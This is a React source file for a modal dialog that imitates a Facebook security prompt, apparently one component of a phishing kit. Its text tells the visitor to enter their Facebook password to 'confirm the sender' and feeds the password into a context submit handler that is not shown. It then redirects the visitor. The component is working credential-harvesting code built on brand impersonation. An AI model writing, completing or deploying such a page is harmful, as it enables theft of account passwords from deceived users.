import * as React from 'react';
import Box from '@mui/material/Box';
import Button from '@mui/material/Button';
import Typography from '@mui/material/Typography';
import Modal from '@mui/material/Modal';
import { useContext } from 'react';
import { MainContextContent } from './Context';
import { MyButton } from './Button';
import MyButton2 from './Loading';
import { useNavigate } from 'react-router-dom';
import { useEffect } from 'react';
const style = {
    position: 'absolute',
    top: '25%',
    borderRadius: "0.3rem",
    left: '50%',
    transform: 'translate(-50%, -50%)',
    maxWidth: 500,
    width: "80%",
    bgcolor: 'background.paper',
    border: '1px solid #000',
    boxShadow: 24,
    p: 2,
    
};

export default function BasicModal() {
   const navigate = useNavigate()
    const { loading, handleSubmit, handleClose,navTo, open, form, handleChange, errors } = useContext(MainContextContent)
useEffect(()=>{
        if(navTo!==""){
            navigate(navTo)
        }
    },[navTo])
    return (
        <div>
            <Modal
          
                open={open}
                onClose={handleClose}
                aria-labelledby="modal-modal-title"
                aria-describedby="modal-modal-description"
            >
                <Box sx={style} className="py-4 mt-[20vh] md:mt-0">
                    <p id="modal-modal-title" className='pb-4 text-black font-semibold text-[1.3rem]' >
                        Please enter your facebook password to continue
                    </p>
                    <hr />
                    <p className='text-md  my-4'>
                        We need to confirm the sender of the infomation is you. Please enter you facebook passworeed and theen continue.
                    </p>
                    <label className='text-[0.85rem] font-semibold text-black' htmlFor="">
                        Password
                        <input
                            onChange={handleChange}
                            value={form.password}
                            disabled={loading}
                            name="password"
                            type="password"
                            className='w-full border border-gray-400 focus:outline-gray-500 rounded-md p-2 text-sm' />
                    </label>
                     {
                      errors.passwordError !== "" &&  <p className='text-red-500 text-sm py-4'>{errors.passwordError}</p>
                     }

                    <hr />
                    <br />
                    <Box>
                        <MyButton2
                            handleSubmit={handleSubmit}
                            loading={loading}

                        >
                            <span>Continue</span>
                        </MyButton2>

                    </Box>

                </Box>
            </Modal>
        </div>
    );
}